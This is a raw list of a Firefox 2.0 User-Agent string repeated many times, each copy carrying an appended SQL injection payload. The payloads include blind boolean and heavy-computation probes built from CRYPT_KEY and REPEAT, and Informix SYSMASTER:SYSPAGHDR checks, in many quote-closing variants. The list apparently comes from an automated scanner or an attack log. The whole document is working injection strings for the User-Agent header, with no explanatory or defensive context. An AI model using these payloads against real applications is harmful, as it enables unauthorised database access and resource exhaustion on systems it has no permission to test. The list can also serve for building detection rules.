Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(77)||CHAR(78)||CHAR(100)||CHAR(69) WHERE 4601=4601 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT gTWH WHERE 6964=6964 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS kdCa WHERE 5747=5747 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- aVkF
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS cFyo WHERE 3479=3479 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- GotC
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 9310=9310 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- qtUd
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 1172=1172 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- MCIC
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- utPM
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- GGPU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ((2361=2361
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ('Slum'='Slum
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND 'hpjh' LIKE 'hpjh
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (((\x22qJkS\x22=\x22qJkS
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND \x22kQwt\x22=\x22kQwt
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (((\x22ZMAh\x22 LIKE \x22ZMAh
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND \x22jSqw\x22 LIKE \x22jSqw
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)# aJnY
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 7956=7956 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- nweB
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 8967=8967 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- OBaA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 6608=6608 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- eGfM
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT CHAR(110)||CHAR(102)||CHAR(85)||CHAR(112) WHERE 8716=8716 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))+'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS PTkQ WHERE 2764=2764 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- Odzt
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS jlee WHERE 7921=7921 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- pheS
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 4534=4534 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- vJQp
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 4119=4119 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 7982=7982 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 4663=4663 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(102)||CHAR(117)||CHAR(66)||CHAR(112) FROM DUAL WHERE 7421=7421 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT rVAU WHERE 3835=3835 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT CHAR(88)||CHAR(68)||CHAR(120)||CHAR(90) WHERE 9055=9055 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS Hulc WHERE 8686=8686 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS iMhi WHERE 8587=8587 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 1394=1394 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(120)||CHAR(90)||CHAR(88)||CHAR(102) WHERE 6990=6990 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS oGYT WHERE 2187=2187 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS LKwV WHERE 3117=3117 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS cxdm WHERE 2949=2949 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 5643=5643 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 7137=7137 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- OGdx
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (2335=2335
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((4266=4266
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ('GCYc'='GCYc
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (('kAjQ' LIKE 'kAjQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((('dnXe' LIKE 'dnXe
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'WLNk' LIKE 'WLNk
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((\x22SOwQ\x22=\x22SOwQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (((\x22zbHm\x22=\x22zbHm
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((\x22YuDU\x22 LIKE \x22YuDU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- WjIh
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)# ZyBn
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 8753=8753 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- AQGb
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 8953=8953 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- mofa
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 7968=7968 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- mNRf
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT tRRT WHERE 7358=7358 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT lxnn WHERE 2057=2057 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))+'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT Akib FROM DUAL WHERE 6081=6081 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS nLKF WHERE 5987=5987 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- Nwfl
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS jRQz WHERE 1240=1240 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- ezLB
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS hibw WHERE 3907=3907 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- sSST
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 1554=1554 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- lHNO
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- lRiL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- ooqA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- hYdM
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (('ZttU'='ZttU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((('MtwU'='MtwU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND \x22tkUU\x22=\x22tkUU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((\x22jRgQ\x22 LIKE \x22jRgQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (((\x22SNgK\x22 LIKE \x22SNgK
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND \x22IWPd\x22 LIKE \x22IWPd
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 3559=3559 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- XsDo
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 8948=8948 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- etUM
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT Opwl WHERE 6407=6407 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))+'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT gmwl FROM DUAL WHERE 8690=8690 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT aMga WHERE 1048=1048 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS UtHx WHERE 7311=7311 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- CHnx
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS iBhc WHERE 1347=1347 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- Nwig
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS hpgM WHERE 3889=3889 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- VNgW
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 2874=2874 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT MzRZ FROM DUAL WHERE 3575=3575 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT snrq FROM DUAL WHERE 3890=3890 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT MTJA WHERE 8172=8172 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT ACiP WHERE 3947=3947 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS DbGb WHERE 8466=8466 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS KZDd WHERE 4285=4285 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS HqUk WHERE 7963=7963 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 7350=7350 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 4793=4793 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT Ywmj WHERE 8792=8792 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT EAmU FROM DUAL WHERE 2942=2942 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
